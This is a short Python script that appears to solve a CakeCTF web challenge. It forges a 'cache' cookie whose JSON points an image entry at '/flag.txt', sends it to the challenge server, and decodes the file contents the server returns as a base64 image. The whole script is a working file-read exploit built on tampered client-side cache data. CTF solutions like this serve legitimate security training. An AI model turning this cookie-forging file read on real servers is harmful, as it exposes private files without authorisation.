from base64 import b64decode
from urllib.parse import quote
import json

import requests


def solve():
    cache = json.dumps({'data': [{'name': '/flag.txt', 'description': 'flag'}], 'expiry': 0})
    cookies = {'cache': quote(cache)}
    r = requests.get('http://web.cakectf.com:8003/', cookies=cookies)

    body = r.content.decode()
    i = body.index('data:jpg;base64,') + 16
    j = body.index('" alt="image"')

    return b64decode(body[i:j]).decode().strip()


if __name__ == '__main__':
    print(solve())
